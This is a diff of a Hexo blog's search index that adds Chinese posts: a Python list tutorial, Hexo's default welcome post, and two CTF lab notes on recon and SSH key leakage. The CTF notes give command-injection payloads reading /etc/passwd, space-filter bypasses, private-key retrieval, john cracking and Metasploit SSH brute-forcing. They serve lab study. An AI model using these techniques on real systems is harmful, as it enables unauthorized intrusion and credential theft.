+<h1 id="1-列表"><a href="#1-列表" class="headerlink" title="1. 列表"></a>1. 列表</h1><h2 id="1-1-列表是什么及其创建"><a href="#1-1-列表是什么及其创建" class="headerlink" title="1.1 列表是什么及其创建"></a>1.1 列表是什么及其创建</h2><p><strong>列表</strong>是由一系列按特定顺序排列的元素的组成。包括你不仅可以创建包含字⺟表中所有字⺟、数字 0~9 或所有家庭成员姓名的列表，还可以将任何东西加⼊列表，其中的元素之间可以没有任何关系。列表通常包含多个元素，因此给列表指定⼀个表⽰复数的名称（如 letters、digits 或 names）是个不错的主意。<br>你可以把列表理解为C语言中的数组，但是Python的列表是一个更宏观的概念，它可以包括你想到的任何数据内容。<br>Python中，列表用中括号<code>[]</code>表示，用逗号分割其中的元素（ps：这里都是指英文半角下的符号，不能用中文符号，不然就会报错）。<br>举个例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251541693.png"
+                      alt="image.png"
+                ><br>可以看到：Python 将打印列表的内部表⽰，<strong>包括⽅括号。</strong></p>
+<hr>
+<h2 id="1-2-列表的相关操作"><a href="#1-2-列表的相关操作" class="headerlink" title="1.2 列表的相关操作"></a>1.2 列表的相关操作</h2><h3 id="1-2-1-列表索引访问"><a href="#1-2-1-列表索引访问" class="headerlink" title="1.2.1 列表索引访问"></a>1.2.1 列表索引访问</h3><h4 id="单个索引访问"><a href="#单个索引访问" class="headerlink" title="单个索引访问"></a>单个索引访问</h4><p>列表是一个有序集合，也就是说其中的元素并不是无序的，每个元素都有自己的位置，也就是[[#前言]]说的<code>索引</code>。我们要访问列表中的某一个位置，可以直接告诉Python这个位置的索引（我们说的第n个元素或位置，其索引要减去1，也就是索引为n-1）。要访问列表元素，可以指出列表的名称加上元素索引，索引要放在中括号内。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251542461.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>举个例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251543939.png"
+                      alt="image.png"
+                ></p>
+<p>这里有个特殊的方法，可以让你返回列表中的最后一个元素，无论列表的长度是多少，你都可以用索引<code>-1</code>来表示列表的最后一个元素，以此类推，索引<code>-2</code>用来访问倒数第二个元素……，如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251550715.png"
+                      alt="image.png"
+                ></p>
+<p><em>ps：访问的索引不能超过列表最后一个元素的索引，这样将会直接导致报错。只要列表不为空，索引<code>-1</code>来访问列表最后一个元素都有效</em></p>
+<h4 id="索引切片访问"><a href="#索引切片访问" class="headerlink" title="索引切片访问"></a>索引切片访问</h4><p>可以利用<code>[]</code>和<code>:</code>来确定一个索引范围来进行切片，就是对列表的某一段切出来进行打印。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251708866.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>注意：这里<code>:</code>右边的索引是不会被取到的，如下的<code>1:4</code>,是取不到索引为4的位置的元素。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658095.png"
+                      alt="image.png"
+                ></p>
+<p>同样，也可以用负数索引来表示倒数第几个元素<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658968.png"
+                      alt="image.png"
+                ></p>
+<p>有一种特殊情况，在<code>:</code>的左右两边是可以不加索引值的，意思是直接取到头，比如<code>2:</code>，表示从索引为2的（第三个）的元素取到最后一个（包括最后一个）。在前面切片范围的<code>:</code>之后还可以添加一个<code>:</code>，表示步长，所谓步长可以理解为等差数列的公差，就是隔一个步长取一个元素。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251704005.png"
+                      alt="image.png"
+                ></p>
+<p>你也可以用标准化输出来使用列表中的值，也就是第一章的<code>f</code>标准化输出<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251643872.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-2-列表的修改、添加、删除"><a href="#1-2-2-列表的修改、添加、删除" class="headerlink" title="1.2.2 列表的修改、添加、删除"></a>1.2.2 列表的修改、添加、删除</h3><p>Python的列表一般是动态的，也就是你可以对其中的某些元素进行一些操作来改变列表。比如当以后你自己做一个项目的适合，你自己做了一个游戏，游戏中有一些怪物，怪物是用一个列表存储的，当你消灭了一个怪物，这个怪物就会从列表中删除，相应的，当你通过一个关卡，列表中的怪物也会进行更新。</p>
+<h4 id="列表的修改"><a href="#列表的修改" class="headerlink" title="列表的修改"></a>列表的修改</h4><p>列表的修改十分简单，只是利用赋值运算符对某个索引位置的元素进行覆盖赋值。如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251710937.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的添加和删除（更新）"><a href="#列表的添加和删除（更新）" class="headerlink" title="列表的添加和删除（更新）"></a>列表的添加和删除（更新）</h4><p>列表的添加是一个很重要的操作，你可以用来更新你的列表数据，以达到你的目标要求。</p>
+<p>首先介绍一下队列：队列是一种先进先出（FIFO）的数据结构，我们可以使用列表来实现队列的基本功能。我们都知道在一个地方排队，是要从队伍末尾开始排的（不考虑没素质的人）。这样我们列表基本的添加和删除都是在列表的末尾进行操作的</p>
+<h5 id="append-函数"><a href="#append-函数" class="headerlink" title="append()函数"></a>append()函数</h5><p><strong>函数语法：<code>list.append(obj)</code></strong><br>首先来介绍列表的内置函数，可以把一个列表看成一个队列，这个append()函数也是满足队列的条件，是在列表的末尾进行添加。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251720596.png"
+                      alt="image.png"
+                ></p>
+<h5 id="pop-函数"><a href="#pop-函数" class="headerlink" title="pop()函数"></a>pop()函数</h5><p><strong>函数语法：<code>list.pop([index=-1])</code></strong><br><em>ps：pop()的默认参数就是最后一个索引，一般不自主选择（当然也可以自己选择索引）。这里需要注意，pop()函数是有返回值的，返回值就是你选择删除的数据，可以理解为一个抽象的栈，把数据从栈里面弹出来</em><br><code>pop()</code>函数是和<code>append()</code>函数相对的，这个函数是将列表的最后一个元素删除。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251724325.png"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251841067.png"
+                      alt="image.png"
+                ></p>
+<h5 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h5><p><strong>函数语法：<code>list.insert(index, obj)</code></strong><br>    <em>ps：- index – 对象 obj 需要插入的索引位置     - obj – 要插入列表中的对象。</em><br>这个函数字面意思就是插入，你可以插入数据到列表的任意一个地方，你甚至可以插入一个列表，这就是列表的嵌套。当你插入一个数据后，后面的所有数据都会向后移一个位置，也就是索引加一<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251831764.png"
+                      alt="image.png"
+                ></p>
+<h5 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h5><p><strong>语法：<code>del list[index]</code></strong><br><code>del</code><em>不是</em><code>python3</code> 中的<strong>内置函数</strong>，<code>del</code>只是一个关键字，就跟<code>import</code>和<code>return</code>一样<br>del也是可以删除列表中任意位置的数据，你只需要知道数据的索引即可<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251838748.png"
+                      alt="image.png"
+                ></p>
+<h5 id="比较del和pop"><a href="#比较del和pop" class="headerlink" title="比较del和pop()"></a>比较del和pop()</h5><p>当你想要删除数据时该如何选择呢？这个其实很简单，当你想要直接删除数据并且不想再使用这个数据时，你就可以用del语句，直接将数据清楚；当然你也可以用pop()函数，但是不用一个变量来保存这个删除的数据，也就相当于直接删除。如果你想要将数据从列表中取出来，并且要将这个数据用以其他操作，那么你就只能用pop()函数。</p>
+<h5 id="remove-函数"><a href="#remove-函数" class="headerlink" title="remove()函数"></a>remove()函数</h5><p>有时候，你不知道要从列表中删除的值在哪个位置。如果只知道要删除的元素的值，可使⽤ <code>remove()</code> ⽅法。<br><em>ps：<code>remove()</code>函数只会删除第一个满足条件的数据，也就是当找到了第一个需要删除的元素，他就停止寻找了。如果想要删除更多或者全部相同元素，就需要使用循环，这将在后面循环结构的一章进行讲解</em><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251857448.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5><p><strong>函数语法：<code>list.sort(cmp=None, key=None, reverse=False)</code></strong></p>
+<ul>
+<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
+<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
+<li>reverse – 排序规则，reverse &#x3D; True 降序， reverse &#x3D; False 升序（默认）。</li>
+</ul>
+<p>Python有一个内置函数，可以对列表轻松的进行排序。值得注意的是，<code>sort()</code>函数不止对数字进行排序，也可以对字母进行排序。如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251911202.png"
+                      alt="image.png"
+                ></p>
+<p>当然也可以对列表进行逆序，只需要加上参数<code>reverse = True</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251923030.png"
+                      alt="image.png"
+                ></p>
+<h5 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h5><p><code>sort()</code>函数使用之后，列表的顺序就会被永久改变，如果想要进行临时排序，就可以使用<code>sorted()</code>函数<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251931129.png"
+                      alt="image.png"
+                ><br>在调⽤ <code>sorted()</code> 函数后，列表元素的排列顺序并没有变<br>如果要按与字⺟顺序相反的顺序显⽰列表，也可向 <code>sorted()</code> 函数 传递参数 <code>reverse=True</code></p>
+<p><em>ps：在并⾮所有的值都是全小写的时，按字⺟顺序排列列表要复杂⼀些。在确定排列顺序时，有多种解读⼤写字⺟的⽅式，此时要指定准确的排列顺序，可能会比这⾥所做的更加复杂。然而，大多数排序方式是以本节介绍的知识为基础的。</em></p>
+<h5 id="reverse-函数"><a href="#reverse-函数" class="headerlink" title="reverse()函数"></a>reverse()函数</h5><p>要反转列表元素的排列顺序，可使⽤ reverse() ⽅法。这里是将原列表的顺序进行反转，而不是排序后反转<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251934680.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的其他操作"><a href="#列表的其他操作" class="headerlink" title="列表的其他操作"></a>列表的其他操作</h4><h5 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h5><p>这个函数是用来统计列表中某个数据出现的次数的<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946234.png"
+                      alt="image.png"
+                ></p>
+<h5 id="extend-函数"><a href="#extend-函数" class="headerlink" title="extend()函数"></a>extend()函数</h5><p>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946805.png"
+                      alt="image.png"
+                ></p>
+<h5 id="index-函数"><a href="#index-函数" class="headerlink" title="index()函数"></a>index()函数</h5><p>从列表中找出某个值第一个匹配项的索引位置<br><em>ps：如果在列表中有重复元素，只会索引到目标数据第一次出现的索引位置</em><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251947793.png"
+                      alt="image.png"
+                ></p>
+<h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy()函数"></a>copy()函数</h5><p>将一个列表进行复制并返回该复制的列表<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251948401.png"
+                      alt="image.png"
+                ></p>
+<h5 id="clear-函数"><a href="#clear-函数" class="headerlink" title="clear()函数"></a>clear()函数</h5><p>将列表清空<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251949806.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-3-Python列表脚本操作符"><a href="#1-2-3-Python列表脚本操作符" class="headerlink" title="1.2.3 Python列表脚本操作符"></a>1.2.3 Python列表脚本操作符</h3><p>列表对 <code>+</code> 和 <code>*</code> 的操作符与字符串相似。<code>+</code> 号用于组合列表，<code>*</code> 号用于重复列表。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Python 表达式</th>
+<th align="left">结果</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">len([1, 2, 3])</td>
+<td align="left">3</td>
+<td align="left">列表的长度</td>
+</tr>
+<tr>
+<td align="left">[1, 2, 3] + [4, 5, 6]</td>
+<td align="left">[1, 2, 3, 4, 5, 6]</td>
+<td align="left">组合</td>
+</tr>
+<tr>
+<td align="left">[‘Hi!’] * 4</td>
+<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
+<td align="left">重复</td>
+</tr>
+<tr>
+<td align="left">3 in [1, 2, 3]</td>
+<td align="left">True</td>
+<td align="left">元素是否存在于列表中</td>
+</tr>
+<tr>
+<td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td>
+<td align="left">1 2 3</td>
+<td align="left">迭代</td>
+</tr>
+<tr>
+<td align="left">max([1, 2, 3])</td>
+<td align="left">3</td>
+<td align="left">列表中的最大值</td>
+</tr>
+<tr>
+<td align="left">min([1, 2, 3])</td>
+<td align="left">1</td>
+<td align="left">列表中的最小值</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/09/11/60ab45b83526/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Python从入门到精通（工具准备篇）——0. PyCharm+Anaconda+jupyter 的安装（呕心沥血版 ）</title>
     <url>/2024/09/23/4e1c4d362e7a/</url>
     <content><![CDATA[<h1 id="学习准备"><a href="#学习准备" class="headerlink" title="学习准备"></a>学习准备</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><p>本文以下是PyCharm+Anaconda+jupyter的保姆级安装方案，为后面的学习做好准备，如果觉得Anaconda安装太过于麻烦，可以选择一个python版本进行安装和配置环境（详情请自行寻找教程）。</p>
@@ -415,6 +990,66 @@
       </tags>
   </entry>
   <entry>
+    <title>ctf 基本思路</title>
+    <url>/2024/09/11/93f6ba8bb1f2/</url>
+    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在扫描的全部信息里寻找是否为http服务</p>
+</blockquote>
+<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
+<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
+<p>注意到flag.txt，打开获得flag</p>
+<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
+<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
+<p>在浏览器输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
+
+<p> 匿名登录ftp服务器根目录</p>
+<p>发现flag</p>
+<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
+<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
+
+<p>然后依次打开robots.txt中的目录</p>
+<p>发现命令执行窗口</p>
+<p>于是想到命令注入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
+</blockquote>
+<p>找到在home下的用户Summer</p>
+<p>然后利用ssh远程连接</p>
+<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
+<p>于是利用这个端口进行连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
+
+<p>于是得到反弹shell</p>
+<p>利用pwd ls cat more等命令</p>
+<p>查看flag</p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>common</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SambaSMB信息泄露（Serve Message Block)</title>
     <url>/2024/09/11/cfb8804dd1b5/</url>
     <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
@@ -481,55 +1116,89 @@
       </tags>
   </entry>
   <entry>
-    <title>ctf 基本思路</title>
-    <url>/2024/09/11/93f6ba8bb1f2/</url>
-    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
+    <title>ssh密钥泄露</title>
+    <url>/2024/09/11/478a9824d4db/</url>
+    <content><![CDATA[<h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="先用nmap扫描ip端口"><a href="#先用nmap扫描ip端口" class="headerlink" title="先用nmap扫描ip端口"></a>先用nmap扫描ip端口</h3><p>探测靶场开放的服务和服务版本：<code>nmap -sV ip</code></p>
+<p>探测靶场全部信息：<code>nmap -A -v ip</code></p>
+<p>探测靶场的操作系统类型和版本： <code>nmap -O ip</code></p>
+<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
+<hr>
+<h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
+<p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
+<p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
+<p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
+<hr>
+<h3 id="寻找ssh用户名，得到私钥"><a href="#寻找ssh用户名，得到私钥" class="headerlink" title="寻找ssh用户名，得到私钥"></a>寻找ssh用户名，得到私钥</h3><ol>
+<li><p>然后依次打开后面的目录<br>成功下载后，第二个文件就是一个认证文件，可以找到用户名，ssh连接徐娅用户名，假如用户名为simon</p>
+</li>
+<li><p>可能在网站主页寻找</p>
+</li>
+</ol>
+<p><code>ssh -i id_rsa simon@ip</code></p>
+<hr>
+<h4 id="利用nikto寻找是否有私钥"><a href="#利用nikto寻找是否有私钥" class="headerlink" title="利用nikto寻找是否有私钥"></a>利用nikto寻找是否有私钥</h4><p><code>nikto -host ip</code></p>
+<p>可以扫描出敏感目录并且提示 </p>
+<p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
+<p>可以利用<code>wget url</code>来下载文件</p>
+<h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
+<p>ssh2john id_rsa &gt; rsacrack</p>
+<p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
+<p>然后利用破解的密码进行ssh登录</p>
+<hr>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="暴力破解思路"><a href="#暴力破解思路" class="headerlink" title="暴力破解思路"></a>暴力破解思路</h3><p>先下载cupp</p>
+<p><code>git clone https://github.com/jeanphorn/common-password.git</code></p>
+<p>进入目录给cupp.py提权 <code>chmod +x cupp.py</code></p>
+<p>以交互方式创建字典 <code>./cupp.py -i</code></p>
+<p>利用metasploit破解ssh</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username name(对应用户名)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file name.txt(前面生成的字典)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads 5(设置线程)</span><br><span class="line"></span><br><span class="line">show options(查看参数)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span>(返回相关信息)</span><br><span 